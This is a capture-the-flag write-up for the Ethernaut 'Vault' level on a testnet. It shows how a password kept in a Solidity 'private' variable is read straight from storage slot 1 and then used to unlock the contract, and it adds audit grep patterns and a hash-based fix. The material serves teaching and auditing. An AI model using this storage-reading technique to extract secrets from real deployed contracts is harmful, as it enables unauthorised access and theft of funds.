// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }}

  # Ethernaut — Level 8: Vault

**Network:** Sepolia testnet  
**Contract:** `0x5020E7f9B0651875FcCB8dF850C74c5CCaC4Be8b`  
**Date completed:** June 2026

---

## What the challenge was

Unlock the vault by providing the correct password.  
The password was stored as a `private bytes32` variable — the developer assumed it was hidden.

---

## What confused me

- Assumed `private` meant the variable was secret and unreadable
- It only prevents other **contracts** from reading it via Solidity — it does nothing to hide data from anyone reading the blockchain directly

---

## Vulnerability involved

**Sensitive data stored on-chain in a `private` variable.**

The contract:

```solidity
bool public locked = true;
bytes32 private password;

function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}
```

`private` in Solidity only means other contracts cannot read the variable through Solidity code. It does **not** hide the data from the world. Everything stored on a public blockchain is permanently visible to anyone — including all storage slots, regardless of visibility modifier.

---

## How I solved it

**Step 1 — Read storage slot 1 directly**

State variables are stored sequentially starting at slot 0:
- Slot 0 = `locked` (bool)
- Slot 1 = `password` (bytes32)

```javascript
const password = await web3.eth.getStorageAt(
  '0x5020E7f9B0651875FcCB8dF850C74c5CCaC4Be8b', 1
)
```

**Step 2 — Unlocked the vault**
```javascript
await contract.unlock(password)
```

**Step 3 — Verified**
```javascript
await contract.locked()
// returned: false
```

**Step 4 — Submitted the instance** ✅

---

## How storage slots work

Variables are stored sequentially starting at slot 0:

```solidity
contract Example {
    bool public locked;        // slot 0
    bytes32 private password;  // slot 1
    address public owner;      // slot 2
    uint256 public balance;    // slot 3
}
```

For mappings and arrays the slot calculation is more complex but still always readable — nothing is ever truly hidden.

---

## How to read any contract's storage

**Using web3.js:**
```javascript
await web3.eth.getStorageAt(contractAddress, slotNumber)
```

**Using Foundry cast:**
```bash
cast storage <contractAddress> <slotNumber> --rpc-url <sepoliaRPC>
```

**Using Etherscan:**
1. Go to contract address
2. Click **Contract** tab → **Read Contract**
3. Public variables show directly
4. For private variables use the storage reader at the bottom

---

## How to spot this in a real audit

**Search for sensitive data stored on-chain:**
```bash
grep -r "bytes32 private" ./contracts/
grep -r "string private" ./contracts/
grep -r "private password" ./contracts/
grep -r "private secret" ./contracts/
grep -r "private key" ./contracts/
```

**Red flags:**
```solidity
bytes32 private password;        // ❌ readable on-chain
string private secretKey;        // ❌ readable on-chain
bytes32 private encryptionKey;   // ❌ readable on-chain
mapping(address => bytes32) private secrets;  // ❌ readable on-chain
```

**Questions to ask during an audit:**
- Is any sensitive data stored as a state variable?
- Is a `private` variable used for authentication or access control?
- Is a password, key, or secret hardcoded or stored in the contract?
- Is sensitive data passed in transaction calldata? (also publicly visible)

---

## Real world impact

Several DeFi protocols have stored API keys, oracle seeds, or admin passwords in `private` variables thinking they were safe. Once deployed, anyone could read them and exploit admin functions or drain funds.

---

## The fix

**Never store secrets on-chain. Ever.**

If authentication is needed, store a hash instead:
```solidity
// ✅ store the HASH of the password, not the password itself
bytes32 public passwordHash;

function unlock(bytes32 _password) public {
    require(keccak256(abi.encodePacked(_password)) == passwordHash);
    locked = false;
}
```

Even this has limits — the user must send the plaintext password in a transaction to unlock it, which is visible in the transaction calldata to anyone watching the mempool. True secrets belong off-chain.

---

## Key takeaway

> **Nothing on a public blockchain is private. Ever.**

`private` and `internal` are Solidity access modifiers for contract-to-contract interaction only. They provide zero confidentiality against anyone reading blockchain state directly. Treat every state variable — regardless of visibility — as publicly readable.
